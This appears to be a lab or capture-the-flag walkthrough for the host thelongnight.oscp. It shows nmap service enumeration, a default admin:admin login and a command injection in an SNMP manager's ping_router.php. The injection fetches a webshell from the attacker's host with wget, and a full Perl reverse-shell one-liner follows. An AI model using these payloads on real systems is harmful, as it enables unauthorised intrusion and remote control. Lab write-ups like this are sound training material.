# 192.168.32.221

## Enumeration

```
root@kali:~/Downloads# nmap -Pn -sV -sC 192.168.58.95
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:f8:86:0a:d3:84:02:8e:5b:39:10:02:b7:da:a6:fe (RSA)
|   256 43:20:17:22:a0:f4:59:50:7f:d7:f4:ed:f0:8c:ba:f4 (ECDSA)
|_  256 0f:09:8b:2e:a4:15:f7:e1:a6:22:72:5f:90:2e:33:c2 (ED25519)
25/tcp   open   smtp         Postfix smtpd
|_smtp-commands: thelongnight.oscp, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=thelongnight.oscp
| Issuer: commonName=thelongnight.oscp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-11-30T12:29:56
| Not valid after:  2029-11-27T12:29:56
| MD5:   97c9 beb5 7e5e d2fb 784a c497 5e15 7461
|_SHA-1: fa04 e788 61c3 98b7 6822 40ce f697 c5d7 bc7e 1fb5
|_ssl-date: ERROR: Script execution failed (use -d to debug)
80/tcp   open   http         Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Bare - Start Bootstrap Template
81/tcp   open   http         Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: thelongnight.oscp
110/tcp  open   pop3         Dovecot pop3d
|_pop3-capabilities: UIDL TOP AUTH-RESP-CODE PIPELINING CAPA RESP-CODES SASL
143/tcp  open   imap         Dovecot imapd
|_imap-capabilities: more have LOGINDISABLEDA0001 post-login SASL-IR listed LOGIN-REFERRALS ENABLE Pre-login IMAP4rev1 OK LITERAL+ capabilities ID IDLE
445/tcp  closed microsoft-ds
4080/tcp open   http         Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: SNMP MANAGER
|_Requested resource was login.html

```

```
#Login

http://192.168.58.95:4080/ (admin:admin)

```

```

#Command Injection on SNMP Manager

http://192.168.58.95:4080/ping_router.php?cmd=;wget http://localip/shell.txt -O shell.php

command execution is limited, so a webshell is loaded
```

```
#Low Shell

http://192.168.58.95:4080/shell.php?cmd=perl -e 'use Socket;$i="192.168.xx.xx";$p=22;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

IMPORTANT: to exit the webshell, it is recommended to use perl for the reverse shell on port 22.

```

```


